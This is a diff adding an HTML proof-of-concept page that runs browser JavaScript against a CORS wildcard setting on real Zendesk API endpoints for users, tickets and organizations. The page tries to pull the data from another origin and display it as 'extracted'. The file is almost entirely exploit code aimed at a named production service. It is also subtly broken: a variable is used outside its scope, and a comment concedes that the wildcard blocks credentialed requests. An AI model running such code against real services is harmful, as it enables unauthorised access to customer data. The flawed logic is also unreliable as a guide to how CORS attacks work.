@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Wildcard Exploit PoC - 0xbc000349</title>
+</head>
+<body>
+    <h1>Zendesk CORS Wildcard Exploitation PoC</h1>
+    <p>This page attempts to extract sensitive data from Zendesk API endpoints due to the '*' wildcard misconfiguration.</p>
+    <div id="results"></div>
+
+    <script>
+        const targetEndpoints = [
+            'https://support.zendesk.com/api/v2/users/me.json',
+            'https://support.zendesk.com/api/v2/tickets.json',
+            'https://support.zendesk.com/api/v2/organizations.json'
+        ];
+
+        async function exploitCORS(url) {
+            const resultsDiv = document.getElementById('results');
+            try {
+                // Since Access-Control-Allow-Origin is '*', we can fetch data from any origin.
+                // However, '*' prevents 'include credentials'. But if an API key is passed via headers,
+                // and those headers are allowed, data can still be leaked.
+                const response = await fetch(url, {
+                    method: 'GET',
+                    mode: 'cors'
+                });
+
+                const data = await response.json();
+                resultsDiv.innerHTML += `<p style="color: green;">[+] Success extracting from ${url}: <br><code>${JSON.stringify(data).substring(0, 200)}...</code></p>`;
+            } catch (error) {
+                resultsDiv.innerHTML += `<p style="color: red;">[-] Failed to extract from ${url}: ${error.message}</p>`;
+            }
+        }
+
+        resultsDiv.innerHTML = "<p>Starting extraction...</p>";
+        targetEndpoints.forEach(url => exploitCORS(url));
+    </script>
+</body>
+</html>
